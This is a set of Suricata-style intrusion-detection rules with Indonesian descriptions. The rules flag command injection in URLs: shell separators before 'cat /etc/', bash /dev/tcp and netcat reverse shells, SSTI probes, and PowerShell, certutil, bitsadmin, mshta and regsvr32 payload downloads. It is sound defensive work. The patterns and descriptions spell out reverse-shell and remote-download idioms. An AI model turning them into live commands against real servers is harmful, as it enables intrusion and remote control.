rules.msg: WEB CMDi shell-separator + cat /etc/ in http.uri [medium]
rules.raw: alert http any any -> any any (msg:"WEB CMDi shell-separator + cat /etc/ in http.uri [medium]"; flow:established,to_server; http.uri; content:"cat /etc/"; nocase; fast_pattern; pcre:"/[\x3b\x7c\x26\x60]\s*cat\s+\/etc\//i"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence medium, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120001_shellsep-cat-etc/poc.sh, tag cmdi, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120001; rev:1;)

description.attack: Command injection: penyerang menyisipkan pemisah shell (; | & atau backtick) lalu perintah `cat /etc/...` di parameter URL untuk membaca file sensitif server.
description.impact: Pembacaan file rahasia server (mis. /etc/passwd, config) — pintu masuk ke kompromi penuh.
description.detects: Pola pemisah-shell tepat sebelum `cat /etc/` di URL; URL sah tidak pernah membawanya.

rules.msg: WEB CMDi bash reverse shell /dev/tcp/ in http.uri [high]
rules.raw: alert http any any -> any any (msg:"WEB CMDi bash reverse shell /dev/tcp/ in http.uri [high]"; flow:established,to_server; http.uri; content:"/dev/tcp/"; nocase; fast_pattern; pcre:"/\/dev\/tcp\/(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9.-]+)\/\d{1,5}/i"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120002_bash-reverse-shell/poc.sh, tag cmdi-revshell, created_at 2026_05_19, updated_at 2026_05_19, author huntingyuk; sid:9120002; rev:1;)

description.attack: Penyerang menyuntik idiom reverse-shell bash `/dev/tcp/<host>/<port>` lewat command injection agar server 'menelepon balik' ke mesin penyerang.
description.impact: Shell interaktif penuh ke server (Remote Code Execution) — kendali penuh.
description.detects: Idiom `/dev/tcp/<host>/<port>` di URL — tidak pernah muncul di lalu lintas jinak.

rules.msg: WEB SSTI computed probe {{7*7}} (Jinja/Twig) in http.uri [medium]

description.attack: Server-Side Template Injection (SSTI): penyerang mengirim probe aritmetika `{{7*7}}` (Jinja/Twig) untuk menguji apakah input dieksekusi sebagai template.
description.impact: SSTI yang berhasil biasanya berujung Remote Code Execution di server.
description.detects: Literal probe `{{7*7}}` di URL (threshold 3/60 detik sebagai kompensator FP).

description.attack: Command injection PowerShell: penyerang menjalankan perintah ter-encode base64 lewat flag `-EncodedCommand` agar lolos filter.
description.impact: Eksekusi perintah arbitrer di server Windows (RCE).
description.detects: `powershell` + flag -e/-enc/-EncodedCommand diikuti blob base64 panjang (threshold 3/60 detik).

description.attack: Pasca command injection di Windows, penyerang pakai LOLBin `certutil -urlcache -f http://...` untuk mengunduh malware tahap-2.
description.impact: Penarikan & eksekusi malware (beacon C2, ransomware) — pijakan jadi kendali penuh persisten.
description.detects: Kombinasi `certutil` + `-urlcache` + URL http(s) dalam jendela terbatas di URL request.

description.attack: Pasca command injection Windows, penyerang pakai LOLBin `bitsadmin /transfer ... http://...` untuk mengunduh malware tahap-2 (alternatif certutil).
description.impact: Penarikan & eksekusi malware (beacon C2/ransomware) — pijakan jadi kendali penuh persisten.
description.detects: Kombinasi `bitsadmin` + `/transfer` + URL http(s) dalam jendela terbatas di URL.

description.impact: Remote Code Execution / file-less malware loader (sering jadi tahap awal infection chain).
description.detects: `mshta` + URL http(s) berakhiran `.hta/.html/.htm/.js` dalam jendela terbatas di URL request.

rules.raw: alert http any any -> any any (msg:"WEB CMDi Windows regsvr32 Squiblydoo (scrobj.dll) remote scriptlet in http.uri [high]"; flow:established,to_server; http.uri; content:"scrobj.dll"; nocase; fast_pattern; pcre:"/regsvr32(?:\.exe)?[^\r\n]{0,80}(?:\/i\x3a|%2fi%3a)https?(?::|%3a)(?:\/\/|%2f%2f)[^\r\n]{0,80}scrobj\.dll/i"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0005, mitre_tactic_name Defense-Evasion, mitre_technique_id T1218.010, mitre_technique_name Regsvr32, kill_chain Installation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120008_regsvr32-squiblydoo/poc.sh, tag cmdi-lolbin, created_at 2026_05_20, updated_at 2026_05_20, author huntingyuk; sid:9120008; rev:1;)

description.impact: Remote Code Execution dengan binary signed-Microsoft (defense evasion).
description.detects: Kombinasi `regsvr32` + `/i:http(s)://` + `scrobj.dll` dalam jendela terbatas di URL.

description.attack: Pasca command injection, penyerang pakai `python -c '<script>'` untuk eksekusi inline berisi `os.system`/`subprocess`/`socket.socket` (reverse shell, exec perintah arbitrer).
description.impact: Remote Code Execution / reverse shell di server target — penyerang dapat shell penuh.
description.detects: `python -c` + script berisi import berbahaya (`os.system`/`subprocess.Popen|run|call`/`socket.socket`/`__import__`) di URL.

rules.raw: alert http any any -> any any (msg:"WEB CMDi netcat -e reverse shell (nc/ncat -e /bin/sh) in http.uri [high]"; flow:established,to_server; http.uri; content:"nc -e"; nocase; fast_pattern; pcre:"/n(?:c|cat)(?:\.traditional)?(?:\s|%20|\+)-e(?:\s|%20|\+)\/bin\/(?:sh|bash|dash|zsh)[^\r\n]{0,40}?(?:\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9.-]+)(?:\s|%20|\+)\d{1,5}/i"; classtype:web-application-attack; metadata: asset_category web-mixed, owasp A03-Injection, attack_target Server, mitre_tactic_id TA0002, mitre_tactic_name Execution, mitre_technique_id T1059, mitre_technique_name Command-and-Scripting-Interpreter, kill_chain Exploitation, confidence high, signature_severity Critical, deployment Perimeter, network_mode plain, cve none, poc_ref tests/poc/9120010_nc-revshell/poc.sh, tag cmdi-revshell, created_at 2026_05_20, updated_at 2026_05_20, author huntingyuk; sid:9120010; rev:1;)

description.attack: Pasca command injection, penyerang panggil `nc -e /bin/sh <attacker> <port>` — idiom reverse-shell klasik (juga `ncat -e`, varian distro).
description.impact: Reverse shell penuh ke server penyerang — kendali shell interaktif terhadap server target.
description.detects: `nc -e` / `ncat -e` + path shell (`/bin/sh|bash|dash|zsh`) + IP/hostname + port di URL — high conf, tanpa threshold.
